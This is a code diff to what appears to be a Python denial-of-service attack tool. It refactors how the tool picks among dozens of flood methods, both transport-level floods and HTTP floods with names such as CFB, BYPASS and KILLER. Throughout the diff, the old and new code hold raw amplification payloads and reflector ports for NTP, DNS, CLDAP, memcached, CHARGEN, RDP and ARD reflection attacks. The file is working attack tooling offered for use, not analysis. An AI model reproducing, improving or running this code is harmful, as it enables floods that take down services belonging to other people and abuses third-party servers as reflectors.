@@ -10,7 +10,7 @@ from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from re import compile
-from secrets import choice as randchoice
+from random import choice as randchoice
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
@@ -393,6 +393,19 @@ class Layer4(Thread):
         if proxies:
             self._proxies = list(proxies)
 
+        self.methods = {
+            "UDP": self.UDP,
+            "SYN": self.SYN,
+            "VSE": self.VSE,
+            "TS3": self.TS3,
+            "MCPE": self.MCPE,
+            "FIVEM": self.FIVEM,
+            "MINECRAFT": self.MINECRAFT,
+            "CPS": self.CPS,
+            "CONNECTION": self.CONNECTION,
+            "MCBOT": self.MCBOT,
+        }
+
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
@@ -412,60 +425,6 @@ class Layer4(Thread):
         s.settimeout(.9)
         s.connect(self._target)
         return s
-
-    def select(self, name):
-        self.SENT_FLOOD = self.TCP
-        if name == "UDP": self.SENT_FLOOD = self.UDP
-        if name == "SYN": self.SENT_FLOOD = self.SYN
-        if name == "VSE": self.SENT_FLOOD = self.VSE
-        if name == "TS3": self.SENT_FLOOD = self.TS3
-        if name == "MCPE": self.SENT_FLOOD = self.MCPE
-        if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
-        if name == "ICMP":
-            self.SENT_FLOOD = self.ICMP
-            self._target = (self._target[0], 0)
-
-        if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
-        if name == "CPS": self.SENT_FLOOD = self.CPS
-        if name == "CONNECTION": self.SENT_FLOOD = self.CONNECTION
-        if name == "MCBOT": self.SENT_FLOOD = self.MCBOT
-
-        if name == "RDP":
-            self._amp_payload = (
-                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
-                3389)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "CLDAP":
-            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
-                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
-                                 389)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "MEM":
-            self._amp_payload = (
-                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "CHAR":
-            self._amp_payload = (b'\x01', 19)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "ARD":
-            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "NTP":
-            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "DNS":
-            self._amp_payload = (
-                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
-                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
-                53)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
 
     def TCP(self) -> None:
         s = None
@@ -635,6 +594,52 @@ class Layer4(Thread):
             payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
         return payloads
 
+    def select(self, name):
+        self.SENT_FLOOD = self.TCP
+        for key, value in self.methods.items():
+            if name == key:
+                self.SENT_FLOOD = value
+            elif name == "ICMP":
+                self.SENT_FLOOD = self.ICMP
+                self._target = (self._target[0], 0)
+            elif name == "RDP":
+                self._amp_payload = (
+                    b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
+                    3389)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "CLDAP":
+                self._amp_payload = (
+                    b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
+                    b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
+                    389)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "MEM":
+                self._amp_payload = (
+                    b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "CHAR":
+                self._amp_payload = (b'\x01', 19)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "ARD":
+                self._amp_payload = (b'\x00\x14\x00\x00', 3283)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "NTP":
+                self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+            elif name == "DNS":
+                self._amp_payload = (
+                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
+                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
+                    53)
+                self.SENT_FLOOD = self.AMP
+                self._amp_payloads = cycle(self._generate_amp())
+
 
 # noinspection PyBroadException,PyUnusedLocal
 class HttpFlood(Thread):
@@ -672,6 +677,32 @@ class HttpFlood(Thread):
 
         if not self._target.host[len(self._target.host) - 1].isdigit():
             self._raw_target = (self._host, (self._target.port or 80))
+
+        self.methods = {
+            "POST": self.POST,
+            "CFB": self.CFB,
+            "CFBUAM": self.CFBUAM,
+            "XMLRPC": self.XMLRPC,
+            "BOT": self.BOT,
+            "APACHE": self.APACHE,
+            "BYPASS": self.BYPASS,
+            "DGB": self.DGB,
+            "OVH": self.OVH,
+            "AVB": self.AVB,
+            "STRESS": self.STRESS,
+            "DYN": self.DYN,
+            "SLOW": self.SLOW,
+            "GSB": self.GSB,
+            "RHEX": self.RHEX,
+            "STOMP": self.STOMP,
+            "NULL": self.NULL,
+            "COOKIE": self.COOKIES,
+            "TOR": self.TOR,
+            "EVEN": self.EVEN,
+            "DOWNLOADER": self.DOWNLOADER,
+            "BOMB": self.BOMB,
+            "KILLER": self.KILLER,
+        }
 
         if not referers:
             referers: List[str] = [
@@ -1191,53 +1222,14 @@ class HttpFlood(Thread):
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
-        if name == "POST":
-            self.SENT_FLOOD = self.POST
-        if name == "CFB":
-            self.SENT_FLOOD = self.CFB
-        if name == "CFBUAM":
-            self.SENT_FLOOD = self.CFBUAM
-        if name == "XMLRPC":
-            self.SENT_FLOOD = self.XMLRPC
-        if name == "BOT":
-            self.SENT_FLOOD = self.BOT
-        if name == "APACHE":
-            self.SENT_FLOOD = self.APACHE
-        if name == "BYPASS":
-            self.SENT_FLOOD = self.BYPASS
-        if name == "DGB":
-            self.SENT_FLOOD = self.DGB
-        if name == "OVH":
-            self.SENT_FLOOD = self.OVH
-        if name == "AVB":
-            self.SENT_FLOOD = self.AVB
-        if name == "STRESS":
-            self.SENT_FLOOD = self.STRESS
-        if name == "DYN":
-            self.SENT_FLOOD = self.DYN
-        if name == "SLOW":
-            self.SENT_FLOOD = self.SLOW
-        if name == "GSB":
-            self.SENT_FLOOD = self.GSB
-        if name == "RHEX":
-            self.SENT_FLOOD = self.RHEX
-        if name == "STOMP":
-            self.SENT_FLOOD = self.STOMP
-        if name == "NULL":
-            self.SENT_FLOOD = self.NULL
-        if name == "COOKIE":
-            self.SENT_FLOOD = self.COOKIES
-        if name == "TOR":
-            self.SENT_FLOOD = self.TOR
-        if name == "PPS":
-            self.SENT_FLOOD = self.PPS
-            self._defaultpayload = (
-                    self._defaultpayload +
-                    f"Host: {self._target.authority}\r\n\r\n").encode()
-        if name == "EVEN": self.SENT_FLOOD = self.EVEN
-        if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
-        if name == "BOMB": self.SENT_FLOOD = self.BOMB
-        if name == "KILLER": self.SENT_FLOOD = self.KILLER
+        for key, value in self.methods.items():
+            if name == key:
+                self.SENT_FLOOD = value
+            elif name == "PPS":
+                self.SENT_FLOOD = self.PPS
+                self._defaultpayload = (
+                        self._defaultpayload +
+                        f"Host: {self._target.authority}\r\n\r\n").encode()
 
 
 class ProxyManager:
@@ -1309,12 +1301,7 @@ class ToolsConsole:
                 print("Commands: HELP, CLEAR, BACK, EXIT")
                 continue
 
-            if (cmd == "E") or \
-                    (cmd == "EXIT") or \
-                    (cmd == "Q") or \
-                    (cmd == "QUIT") or \
-                    (cmd == "LOGOUT") or \
-                    (cmd == "CLOSE"):
+            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                 exit(-1)
 
             if cmd == "CLEAR":
@@ -1365,12 +1352,7 @@ class ToolsConsole:
                         if domain.upper() == "CLEAR":
                             print("\033c")
                             continue
-                        if (domain.upper() == "E") or \
-                                (domain.upper() == "EXIT") or \
-                                (domain.upper() == "Q") or \
-                                (domain.upper() == "QUIT") or \
-                                (domain.upper() == "LOGOUT") or \
-                                (domain.upper() == "CLOSE"):
+                        if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                             exit(-1)
                         if "/" not in domain: continue
                         logger.info("please wait ...")
@@ -1389,12 +1371,7 @@ class ToolsConsole:
                     if domain.upper() == "CLEAR":
                         print("\033c")
                         continue
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
+                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                         exit(-1)
                     domain = domain.replace('https://',
                                             '').replace('http://', '')
@@ -1423,12 +1400,7 @@ class ToolsConsole:
                     if domain.upper() == "CLEAR":
                         print("\033c")
                         continue
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
+                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                         exit(-1)
                     domain = domain.replace('https://',
                                             '').replace('http://', '')
@@ -1446,12 +1418,7 @@ class ToolsConsole:
                     if domain.upper() == "BACK": break
                     if domain.upper() == "CLEAR":
                         print("\033c")
-                    if (domain.upper() == "E") or \
-                            (domain.upper() == "EXIT") or \
-                            (domain.upper() == "Q") or \
-                            (domain.upper() == "QUIT") or \
-                            (domain.upper() == "LOGOUT") or \
-                            (domain.upper() == "CLOSE"):
+                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                         exit(-1)
 
                     domain = domain.replace('https://',
